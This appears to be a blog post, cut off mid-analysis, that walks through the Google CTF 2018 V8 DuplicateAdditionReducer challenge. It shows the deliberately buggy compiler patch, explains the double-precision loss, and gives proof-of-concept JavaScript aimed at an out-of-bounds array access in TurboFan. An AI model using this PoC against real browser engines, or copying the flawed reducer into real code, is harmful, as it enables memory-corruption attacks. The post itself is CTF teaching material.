<!doctype html>
<html lang="en-us">
  <head>
    <title>V8 Challange DuplicateAdditionReducer // Xploiter</title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.87.0" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="John Sherchan" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="https://xpldotjs.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="V8 Challange DuplicateAdditionReducer"/>
<meta name="twitter:description" content="Introduction Thiis is the challenge from google-ctf-2018. This post heavily rely on this blog post.
Building Challenge V8 mkdir v8 cd v8 fetch v8 cd v8 ./build/install-build-deps.sh git reset --hard dde25872f58951bb0148cf43d6a504ab2f280485 gclient sync git apply ../../attachments/addition-reducer.patch tools/dev/v8gen.py x64.debug ninja -C out.gn/x64.debug Patch Analysis &#43;&#43;&#43; b/src/compiler/duplicate-addition-reducer.cc @@ -0,0 &#43;1,71 @@ &#43;#include &#34;src/compiler/duplicate-addition-reducer.h&#34; &#43; &#43;#include &#34;src/compiler/common-operator.h&#34; &#43;#include &#34;src/compiler/graph.h&#34; &#43;#include &#34;src/compiler/node-properties.h&#34; &#43; &#43;namespace v8 { &#43;namespace internal { &#43;namespace compiler { &#43; &#43;DuplicateAdditionReducer::DuplicateAdditionReducer(Editor* editor, Graph* graph, &#43; CommonOperatorBuilder* common) &#43; : AdvancedReducer(editor), &#43; graph_(graph), common_(common) {} &#43; &#43;Reduction DuplicateAdditionReducer::Reduce(Node* node) { &#43; switch (node-&gt;opcode()) { &#43; case IrOpcode::kNumberAdd: &#43; return ReduceAddition(node); &#43; default: &#43; return NoChange(); &#43; } &#43;} &#43; &#43;Reduction DuplicateAdditionReducer::ReduceAddition(Node* node) { &#43; DCHECK_EQ(node-&gt;op()-&gt;ControlInputCount(), 0); &#43; DCHECK_EQ(node-&gt;op()-&gt;EffectInputCount(), 0); &#43; DCHECK_EQ(node-&gt;op()-&gt;ValueInputCount(), 2); &#43; &#43; Node* left = NodeProperties::GetValueInput(node, 0); &#43; if (left-&gt;opcode() !"/>

    <meta property="og:title" content="V8 Challange DuplicateAdditionReducer" />
<meta property="og:description" content="Introduction Thiis is the challenge from google-ctf-2018. This post heavily rely on this blog post.
Building Challenge V8 mkdir v8 cd v8 fetch v8 cd v8 ./build/install-build-deps.sh git reset --hard dde25872f58951bb0148cf43d6a504ab2f280485 gclient sync git apply ../../attachments/addition-reducer.patch tools/dev/v8gen.py x64.debug ninja -C out.gn/x64.debug Patch Analysis &#43;&#43;&#43; b/src/compiler/duplicate-addition-reducer.cc @@ -0,0 &#43;1,71 @@ &#43;#include &#34;src/compiler/duplicate-addition-reducer.h&#34; &#43; &#43;#include &#34;src/compiler/common-operator.h&#34; &#43;#include &#34;src/compiler/graph.h&#34; &#43;#include &#34;src/compiler/node-properties.h&#34; &#43; &#43;namespace v8 { &#43;namespace internal { &#43;namespace compiler { &#43; &#43;DuplicateAdditionReducer::DuplicateAdditionReducer(Editor* editor, Graph* graph, &#43; CommonOperatorBuilder* common) &#43; : AdvancedReducer(editor), &#43; graph_(graph), common_(common) {} &#43; &#43;Reduction DuplicateAdditionReducer::Reduce(Node* node) { &#43; switch (node-&gt;opcode()) { &#43; case IrOpcode::kNumberAdd: &#43; return ReduceAddition(node); &#43; default: &#43; return NoChange(); &#43; } &#43;} &#43; &#43;Reduction DuplicateAdditionReducer::ReduceAddition(Node* node) { &#43; DCHECK_EQ(node-&gt;op()-&gt;ControlInputCount(), 0); &#43; DCHECK_EQ(node-&gt;op()-&gt;EffectInputCount(), 0); &#43; DCHECK_EQ(node-&gt;op()-&gt;ValueInputCount(), 2); &#43; &#43; Node* left = NodeProperties::GetValueInput(node, 0); &#43; if (left-&gt;opcode() !" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://xpldotjs.github.io/posts/v8-challange-duplicateadditionreducer/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-08-26T00:58:14+05:45" />
<meta property="article:modified_time" content="2021-08-26T00:58:14+05:45" />



  </head>
  <body>
    <header class="app-header">
      <a href="https://xpldotjs.github.io"><img class="app-header-avatar" src="/avatar.jpg" alt="John Sherchan" /></a>
      <h1>Xploiter</h1>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/tags/">Tags</a>
      </nav>
      <p>In love with Browser Exploitation</p>
      <div class="app-header-social">
        
          <a href="https://github.com/xpldotjs" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
  <title>My Github</title>
  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
</svg>
          </a>
        
          <a href="https://www.facebook.com/john.sherchan.9/" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-facebook">
  <title>My Facebook</title>
  <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path>
</svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">V8 Challange DuplicateAdditionReducer</h1>
      <div class="post-meta">
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Aug 26, 2021
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          12 min read
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
  <title>tag</title>
  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
</svg>
              <a class="tag" href="https://xpldotjs.github.io/tags/browser/">browser</a>
              <a class="tag" href="https://xpldotjs.github.io/tags/v8/">v8</a>
              <a class="tag" href="https://xpldotjs.github.io/tags/chrome/">chrome</a>
              <a class="tag" href="https://xpldotjs.github.io/tags/v8ctf/">v8ctf</a>
        </div>
      </div>
    </header>
    <div class="post-content">
      <h3 id="introduction">Introduction</h3>
<p>Thiis is the challenge from google-ctf-2018. This post heavily rely on this blog <a href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/">post</a>.</p>
<h4 id="building-challenge-v8">Building Challenge V8</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mkdir v8
cd v8
fetch v8
cd v8
./build/install-build-deps.sh
git reset --hard dde25872f58951bb0148cf43d6a504ab2f280485
gclient sync
git apply ../../attachments/addition-reducer.patch
tools/dev/v8gen.py x64.debug
ninja -C out.gn/x64.debug
</code></pre></div><h4 id="patch-analysis">Patch Analysis</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff"><span style="color:#a6e22e">+++ b/src/compiler/duplicate-addition-reducer.cc
</span><span style="color:#a6e22e"></span><span style="color:#75715e">@@ -0,0 +1,71 @@
</span><span style="color:#75715e"></span><span style="color:#a6e22e">+#include &#34;src/compiler/duplicate-addition-reducer.h&#34;
</span><span style="color:#a6e22e">+
</span><span style="color:#a6e22e">+#include &#34;src/compiler/common-operator.h&#34;
</span><span style="color:#a6e22e">+#include &#34;src/compiler/graph.h&#34;
</span><span style="color:#a6e22e">+#include &#34;src/compiler/node-properties.h&#34;
</span><span style="color:#a6e22e">+
</span><span style="color:#a6e22e">+namespace v8 {
</span><span style="color:#a6e22e">+namespace internal {
</span><span style="color:#a6e22e">+namespace compiler {
</span><span style="color:#a6e22e">+
</span><span style="color:#a6e22e">+DuplicateAdditionReducer::DuplicateAdditionReducer(Editor* editor, Graph* graph,
</span><span style="color:#a6e22e">+                     CommonOperatorBuilder* common)
</span><span style="color:#a6e22e">+    : AdvancedReducer(editor),
</span><span style="color:#a6e22e">+      graph_(graph), common_(common) {}
</span><span style="color:#a6e22e">+
</span><span style="color:#a6e22e">+Reduction DuplicateAdditionReducer::Reduce(Node* node) {
</span><span style="color:#a6e22e">+  switch (node-&gt;opcode()) {
</span><span style="color:#a6e22e">+    case IrOpcode::kNumberAdd:
</span><span style="color:#a6e22e">+      return ReduceAddition(node);
</span><span style="color:#a6e22e">+    default:
</span><span style="color:#a6e22e">+      return NoChange();
</span><span style="color:#a6e22e">+  }
</span><span style="color:#a6e22e">+}
</span><span style="color:#a6e22e">+
</span><span style="color:#a6e22e">+Reduction DuplicateAdditionReducer::ReduceAddition(Node* node) {
</span><span style="color:#a6e22e">+  DCHECK_EQ(node-&gt;op()-&gt;ControlInputCount(), 0);
</span><span style="color:#a6e22e">+  DCHECK_EQ(node-&gt;op()-&gt;EffectInputCount(), 0);
</span><span style="color:#a6e22e">+  DCHECK_EQ(node-&gt;op()-&gt;ValueInputCount(), 2);
</span><span style="color:#a6e22e">+
</span><span style="color:#a6e22e">+  Node* left = NodeProperties::GetValueInput(node, 0);
</span><span style="color:#a6e22e">+  if (left-&gt;opcode() != node-&gt;opcode()) {
</span><span style="color:#a6e22e">+    return NoChange();
</span><span style="color:#a6e22e">+  }
</span><span style="color:#a6e22e">+
</span><span style="color:#a6e22e">+  Node* right = NodeProperties::GetValueInput(node, 1);
</span><span style="color:#a6e22e">+  if (right-&gt;opcode() != IrOpcode::kNumberConstant) {
</span><span style="color:#a6e22e">+    return NoChange();
</span><span style="color:#a6e22e">+  }
</span><span style="color:#a6e22e">+
</span><span style="color:#a6e22e">+  Node* parent_left = NodeProperties::GetValueInput(left, 0);
</span><span style="color:#a6e22e">+  Node* parent_right = NodeProperties::GetValueInput(left, 1);
</span><span style="color:#a6e22e">+  if (parent_right-&gt;opcode() != IrOpcode::kNumberConstant) {
</span><span style="color:#a6e22e">+    return NoChange();
</span><span style="color:#a6e22e">+  }
</span><span style="color:#a6e22e">+
</span><span style="color:#a6e22e">+  double const1 = OpParameter&lt;double&gt;(right-&gt;op());
</span><span style="color:#a6e22e">+  double const2 = OpParameter&lt;double&gt;(parent_right-&gt;op());
</span><span style="color:#a6e22e">+  Node* new_const = graph()-&gt;NewNode(common()-&gt;NumberConstant(const1+const2));
</span><span style="color:#a6e22e">+
</span><span style="color:#a6e22e">+  NodeProperties::ReplaceValueInput(node, parent_left, 0);
</span><span style="color:#a6e22e">+  NodeProperties::ReplaceValueInput(node, new_const, 1);
</span><span style="color:#a6e22e">+
</span><span style="color:#a6e22e">+  return Changed(node);
</span><span style="color:#a6e22e">+}
</span><span style="color:#a6e22e">+
</span><span style="color:#a6e22e">+}  // namespace compiler
</span><span style="color:#a6e22e">+}  // namespace internal
</span><span style="color:#a6e22e">+}  // namespace v8
</span></code></pre></div><p>Inside the <code>DuplicateAdditionReducer::Reduce</code> function we can see there&rsquo;s a switch statement, if the <code>opcode</code> of the node is <code>kNumberAdd</code> it&rsquo;ll call the <code>ReduceAddition</code> function. At the <code>ReduceAddition</code> function there&rsquo;s a 4 possible code path.</p>
<ol>
<li>It checks if the node at the left input edge of the current node is not equal to current node opcode i.e., <code>kNumberAdd</code>. If it is not equal no changes will be made. else</li>
<li>It&rsquo;ll check if the right input node of the current node not equal to opcode <code>kNumberConstant</code>. If it is not equal no changes will be made. else it&rsquo;ll go to the next if statement.</li>
<li>In the 3rd path, it&rsquo;ll check if the opcode of <code>parent_right</code> node is not equal to <code>kNumberConstant</code>. <code>parent_right</code> node is the right node of (left node of current node). If it is not equal then no changes will me made.</li>
<li>This final path reaches if all the if checkes are passed. At this point compiler knows that the <code>right</code> opcode is <code>kNumberConstant</code> and also the opcode of <code>parent_right</code> is <code>kNumberConstant</code>. So, it&rsquo;ll add the both number constant and make new constant. Then the left node of the current node is replaced with <code>parent_left</code> node and the right node is replaced with the <code>new constant </code> node.</li>
</ol>
<p>Following is the visual representation. This image is taken from <a href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/#understanding-the-reduction">@doar-e</a></p>
<p><img src="/posts/static/DoubleAdditionReducer/001-schema_vuln_ctf.png" alt="vuln-schema"></p>
<p>Node Replace:</p>
<p><img src="/posts/static/DoubleAdditionReducer/002-node_replace.png" alt="node-replace"></p>
<p>We can see that the <code>DuplicateAdditionReducer</code> is added in the <code>TypedLoweringPhase</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">diff --git a/src/compiler/pipeline.cc b/src/compiler/pipeline.cc
index 5717c70348..8cca161ad5 100644
<span style="color:#f92672">--- a/src/compiler/pipeline.cc
</span><span style="color:#f92672"></span><span style="color:#a6e22e">+++ b/src/compiler/pipeline.cc
</span><span style="color:#a6e22e"></span><span style="color:#75715e">@@ -27,6 +27,7 @@
</span><span style="color:#75715e"></span> #include &#34;src/compiler/constant-folding-reducer.h&#34;
 #include &#34;src/compiler/control-flow-optimizer.h&#34;
 #include &#34;src/compiler/dead-code-elimination.h&#34;
<span style="color:#a6e22e">+#include &#34;src/compiler/duplicate-addition-reducer.h&#34;
</span><span style="color:#a6e22e"></span> #include &#34;src/compiler/effect-control-linearizer.h&#34;
 #include &#34;src/compiler/escape-analysis-reducer.h&#34;
 #include &#34;src/compiler/escape-analysis.h&#34;
<span style="color:#75715e">@@ -1301,6 +1302,8 @@ struct TypedLoweringPhase {
</span><span style="color:#75715e"></span>                                data-&gt;jsgraph()-&gt;Dead());
     DeadCodeElimination dead_code_elimination(&amp;graph_reducer, data-&gt;graph(),
                                               data-&gt;common(), temp_zone);
<span style="color:#a6e22e">+    DuplicateAdditionReducer duplicate_addition_reducer(&amp;graph_reducer, data-&gt;graph(),
</span><span style="color:#a6e22e">+                                              data-&gt;common());
</span><span style="color:#a6e22e"></span>     JSCreateLowering create_lowering(&amp;graph_reducer, data-&gt;dependencies(),
                                      data-&gt;jsgraph(), data-&gt;js_heap_broker(),
                                      data-&gt;native_context(), temp_zone);
<span style="color:#75715e">@@ -1318,6 +1321,7 @@ struct TypedLoweringPhase {
</span><span style="color:#75715e"></span>                                          data-&gt;js_heap_broker(), data-&gt;common(),
                                          data-&gt;machine(), temp_zone);
     AddReducer(data, &amp;graph_reducer, &amp;dead_code_elimination);
<span style="color:#a6e22e">+    AddReducer(data, &amp;graph_reducer, &amp;duplicate_addition_reducer);
</span><span style="color:#a6e22e"></span>     AddReducer(data, &amp;graph_reducer, &amp;create_lowering);
     AddReducer(data, &amp;graph_reducer, &amp;constant_folding_reducer);
     AddReducer(data, &amp;graph_reducer, &amp;typed_optimization);
</code></pre></div><h3 id="the-bug">The Bug</h3>
<p><code>kNumberConstant</code> uses the type of <code>double</code>.The maximum safe integer in JavaScript (2^53 - 1) and <code>Number.MAX_SAFE_INTEGER</code> constant represents it which means in this range the integers are safe to be represented and compared. So as the value grows it looses the precision, (2^53) is where it begins to loose it precision of 1.</p>
<p>In addtion,Double precision uses a total of 64 bits to encode the sign, exponent, and fractional parts. In IEEE 754 doubles, the sign is encoded using 1 bit, the exponent uses 11 bits, and the remaining 52 bits are mantissa (mantissa are the fractional of number). In normal floating point values, the fractional part ranges between 1.0 and 1.111111â€¦ up to the limits of precision. This means that the leading digit before the point is always 1, so only the fraction part after the point has to be encoded, in 52 bits. In other words, the fractional part has 53 significant binary digits: the leading digit is implicit, the remaining 52 digits are stored explicitly.</p>
<p><img src="/posts/static/DoubleAdditionReducer/IEEE_754_Double_Floating_Point_Format.png" alt="IEEE_754_DOUBLE_FLOATING_POINT"></p>
<p>For instance, let&rsquo;s see if the there will be loss of precision or not:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&gt;</span>   <span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> Number.<span style="color:#a6e22e">MAX_SAFE_INTEGER</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
<span style="color:#ae81ff">9007199254740992</span>
<span style="color:#f92672">&gt;</span>   <span style="color:#a6e22e">y</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
<span style="color:#ae81ff">9007199254740992</span>
<span style="color:#f92672">&gt;</span>   <span style="color:#a6e22e">z</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>
<span style="color:#ae81ff">9007199254740994</span>
<span style="color:#f92672">&gt;</span>   <span style="color:#a6e22e">y</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">z</span>
<span style="color:#66d9ef">false</span>
</code></pre></div><p>So we can see that the <code>x + 1 + 1</code> is not equal to <code>x + 2</code> which is mathematically wrong and will be problemetic.</p>
<h3 id="writing-poc">Writing POC</h3>
<p>Till now i&rsquo;m pretty much clear about the bug, but writing the POC has been always the hardest for me. In this section, i&rsquo;ll try to write my poc on my own. Let&rsquo;s write the simple code which will trigger the <code>DuplicateAdditionReducer::ReduceAddition</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">trigger</span>(<span style="color:#a6e22e">x</span>) {
    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">y</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">x</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;bug&#34;</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">2.2</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">4.4</span>)
    <span style="color:#a6e22e">y</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">y</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">y</span>;
}
<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">trigger</span>(<span style="color:#e6db74">&#34;bug&#34;</span>));
<span style="color:#f92672">%</span><span style="color:#a6e22e">OptimizeFunctionOnNextCall</span>(<span style="color:#a6e22e">trigger</span>);
<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">trigger</span>(<span style="color:#e6db74">&#34;bug&#34;</span>));
</code></pre></div><p>The <code>if</code> statement in the above code is to make <code>phi</code> node, because if the arithmetic expression is <code>2.2 + 1 + 1</code> it&rsquo;ll directly get optimized for the constant in <code>TypedLoweringPhase</code> using <code>ConstantFoldingReducer</code>. Also the <code>NumberAdd</code> appears only if two numeric types  are different i.e, <code>1.1 + 1</code>.
As we can see in the following image we can see that the <code>const1</code> is <code>1</code> and <code>const2</code> is <code>1</code>, which is <code>1 + 1</code> from the above code. At line no <code>61</code> it&rsquo;ll get added and create a new <code>const_node</code>.</p>
<p><img src="/posts/static/DoubleAdditionReducer/003-trigger-001.png" alt="001-trigger"></p>
<p>Now let&rsquo;s build the POC using the precision loss fault.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">trigger</span>(<span style="color:#a6e22e">x</span>) {
	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">arr</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">1.2</span>, <span style="color:#ae81ff">1.3</span>, <span style="color:#ae81ff">1.4</span>, <span style="color:#ae81ff">1.5</span>]
	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">idx</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">x</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;bug&#34;</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">9007199254740992</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">9007199254740989</span>);
	<span style="color:#a6e22e">idx</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">idx</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;  <span style="color:#75715e">// 
</span><span style="color:#75715e"></span>	<span style="color:#a6e22e">idx</span> <span style="color:#f92672">-=</span> <span style="color:#ae81ff">9007199254740989</span>;
	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">arr</span>[<span style="color:#a6e22e">idx</span>];
}

<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">trigger</span>(<span style="color:#e6db74">&#34;bug&#34;</span>));
<span style="color:#f92672">%</span><span style="color:#a6e22e">OptimizeFunctionOnNextCall</span>(<span style="color:#a6e22e">trigger</span>);
<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">trigger</span>(<span style="color:#e6db74">&#34;bug&#34;</span>));
</code></pre></div><h4 id="typerphase">TyperPhase</h4>
<p>In the <code>TyperPhase</code> CheckBounds is generated with type Range(2,3).</p>
<p><img src="/posts/static/DoubleAdditionReducer/004-typer.png" alt="002-typer"></p>
<h4 id="typedloweringphase">TypedLoweringPhase</h4>
<p>When i looked into the <code>TypedLoweringPhase</code>, the range was <code>Range(9007199254740991,9007199254740992)</code> after the the <code>NumberAdd</code> is performed on the <code>phi</code> node and the <code>NumberConstant</code> node in Turbofan. But the actual range is <code>Range(9007199254740991,9007199254740994)</code> which enable us to perform oob. So i wanted to know why the <code>rhs</code> value <code>9007199254740992</code> is not updated to <code>9007199254740994</code> after the addition i.e., <code>9007199254740992 + 2</code>.</p>
<p><img src="/posts/static/DoubleAdditionReducer/012-typed-lowering.png" alt="003-typedlowering"></p>
<p>So i put the breakpoint on <code>OperationTyper::NumberAdd</code> and <code>OperationTyper::AddRanger</code>.</p>
<p>Function <code>NumberAdd</code>, in this function we&rsquo;re only interested in function <code>AddRanger</code> to be called.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#75715e">// src/compiler/operation-typer.cc
</span><span style="color:#75715e"></span>Type OperationTyper<span style="color:#f92672">::</span>NumberAdd(Type lhs, Type rhs) {
  DCHECK(lhs.Is(Type<span style="color:#f92672">::</span>Number()));
  DCHECK(rhs.Is(Type<span style="color:#f92672">::</span>Number()));

  <span style="color:#75715e">// [...]
</span><span style="color:#75715e"></span>  
  <span style="color:#75715e">// We can give more precise types for integers.
</span><span style="color:#75715e"></span>  Type type <span style="color:#f92672">=</span> Type<span style="color:#f92672">::</span>None();
  lhs <span style="color:#f92672">=</span> Type<span style="color:#f92672">::</span>Intersect(lhs, Type<span style="color:#f92672">::</span>PlainNumber(), zone());
  rhs <span style="color:#f92672">=</span> Type<span style="color:#f92672">::</span>Intersect(rhs, Type<span style="color:#f92672">::</span>PlainNumber(), zone());
  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>lhs.IsNone() <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>rhs.IsNone()) {
    <span style="color:#66d9ef">if</span> (lhs.Is(cache_.kInteger) <span style="color:#f92672">&amp;&amp;</span> rhs.Is(cache_.kInteger)) {
<span style="display:block;width:100%;background-color:#3c3d38">      type <span style="color:#f92672">=</span> AddRanger(lhs.Min(), lhs.Max(), rhs.Min(), rhs.Max());
</span>    } <span style="color:#66d9ef">else</span> {
      <span style="color:#66d9ef">if</span> ((lhs.Maybe(minus_infinity_) <span style="color:#f92672">&amp;&amp;</span> rhs.Maybe(infinity_)) <span style="color:#f92672">||</span>
          (rhs.Maybe(minus_infinity_) <span style="color:#f92672">&amp;&amp;</span> lhs.Maybe(infinity_))) {
        maybe_nan <span style="color:#f92672">=</span> true;
      }
      type <span style="color:#f92672">=</span> Type<span style="color:#f92672">::</span>PlainNumber();
    }
  }
  <span style="color:#75715e">// Take into account the -0 and NaN information computed earlier.
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (maybe_minuszero) type <span style="color:#f92672">=</span> Type<span style="color:#f92672">::</span>Union(type, Type<span style="color:#f92672">::</span>MinusZero(), zone());
  <span style="color:#66d9ef">if</span> (maybe_nan) type <span style="color:#f92672">=</span> Type<span style="color:#f92672">::</span>Union(type, Type<span style="color:#f92672">::</span>NaN(), zone());
  <span style="color:#66d9ef">return</span> type;
}
</code></pre></div><p>Function <code>AddRanger</code>, in this function 4 addition is performed and stored in the <code>results</code> double array.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#75715e">// src/compiler/operation-typer.cc
</span><span style="color:#75715e"></span>Type OperationTyper<span style="color:#f92672">::</span>AddRanger(<span style="color:#66d9ef">double</span> lhs_min, <span style="color:#66d9ef">double</span> lhs_max, <span style="color:#66d9ef">double</span> rhs_min,
                               <span style="color:#66d9ef">double</span> rhs_max) {
  <span style="color:#66d9ef">double</span> results[<span style="color:#ae81ff">4</span>];
  results[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> lhs_min <span style="color:#f92672">+</span> rhs_min;
  results[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> lhs_min <span style="color:#f92672">+</span> rhs_max;
  results[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> lhs_max <span style="color:#f92672">+</span> rhs_min;
  results[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> lhs_max <span style="color:#f92672">+</span> rhs_max;
  <span style="color:#75715e">// Since none of the inputs can be -0, the result cannot be -0 either.
</span><span style="color:#75715e"></span>  <span style="color:#75715e">// However, it can be nan (the sum of two infinities of opposite sign).
</span><span style="color:#75715e"></span>  <span style="color:#75715e">// On the other hand, if none of the &#34;results&#34; above is nan, then the
</span><span style="color:#75715e"></span>  <span style="color:#75715e">// actual result cannot be nan either.
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> nans <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span>; <span style="color:#f92672">++</span>i) {
    <span style="color:#66d9ef">if</span> (std<span style="color:#f92672">::</span>isnan(results[i])) <span style="color:#f92672">++</span>nans;
  }
  <span style="color:#66d9ef">if</span> (nans <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>) <span style="color:#66d9ef">return</span> Type<span style="color:#f92672">::</span>NaN();
<span style="display:block;width:100%;background-color:#3c3d38">  Type type <span style="color:#f92672">=</span> Type<span style="color:#f92672">::</span>Range(array_min(results, <span style="color:#ae81ff">4</span>), array_max(results, <span style="color:#ae81ff">4</span>), zone());
</span>  <span style="color:#66d9ef">if</span> (nans <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) type <span style="color:#f92672">=</span> Type<span style="color:#f92672">::</span>Union(type, Type<span style="color:#f92672">::</span>NaN(), zone());
  <span style="color:#75715e">// Examples:
</span><span style="color:#75715e"></span>  <span style="color:#75715e">//   [-inf, -inf] + [+inf, +inf] = NaN
</span><span style="color:#75715e"></span>  <span style="color:#75715e">//   [-inf, -inf] + [n, +inf] = [-inf, -inf] \/ NaN
</span><span style="color:#75715e"></span>  <span style="color:#75715e">//   [-inf, +inf] + [n, +inf] = [-inf, +inf] \/ NaN
</span><span style="color:#75715e"></span>  <span style="color:#75715e">//   [-inf, m] + [n, +inf] = [-inf, +inf] \/ NaN
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">return</span> type;
}
</code></pre></div><p>In our case,</p>
